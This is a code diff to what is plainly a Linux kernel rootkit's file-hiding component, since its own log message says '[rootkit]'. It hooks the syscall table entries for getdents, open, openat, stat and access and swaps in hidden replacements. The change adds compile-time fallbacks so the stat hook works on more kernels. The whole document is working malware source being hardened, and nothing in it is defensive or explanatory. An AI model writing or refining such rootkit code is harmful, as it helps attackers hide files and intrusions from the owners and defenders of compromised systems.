@@ -441,7 +441,14 @@ int init_file_hiding(void) {
     original_getdents = (void *)sys_call_table[__NR_getdents];
     original_open = (void *)sys_call_table[__NR_open];
     original_openat = (void *)sys_call_table[__NR_openat];
+#ifdef __NR_newfstat
     original_stat = (void *)sys_call_table[__NR_newfstat];
+#elif defined(__NR_fstat)
+    original_stat = (void *)sys_call_table[__NR_fstat];
+#else
+    original_stat = NULL;
+    printk(KERN_WARNING "[rootkit] stat syscall not available\n");
+#endif
     original_access = (void *)sys_call_table[__NR_access];
     
     // Hook系统调用
@@ -450,7 +457,11 @@ int init_file_hiding(void) {
     sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
     sys_call_table[__NR_open] = (unsigned long)hooked_open;
     sys_call_table[__NR_openat] = (unsigned long)hooked_openat;
+#ifdef __NR_newfstat
     sys_call_table[__NR_newfstat] = (unsigned long)hooked_stat;
+#elif defined(__NR_fstat)
+    sys_call_table[__NR_fstat] = (unsigned long)hooked_stat;
+#endif
     sys_call_table[__NR_access] = (unsigned long)hooked_access;
     enable_write_protection();
     
@@ -473,8 +484,13 @@ void cleanup_file_hiding(void) {
             sys_call_table[__NR_open] = (unsigned long)original_open;
         if (original_openat)
             sys_call_table[__NR_openat] = (unsigned long)original_openat;
-        if (original_stat)
+        if (original_stat) {
+#ifdef __NR_newfstat
             sys_call_table[__NR_newfstat] = (unsigned long)original_stat;
+#elif defined(__NR_fstat)
+            sys_call_table[__NR_fstat] = (unsigned long)original_stat;
+#endif
+        }
         if (original_access)
             sys_call_table[__NR_access] = (unsigned long)original_access;
         enable_write_protection();
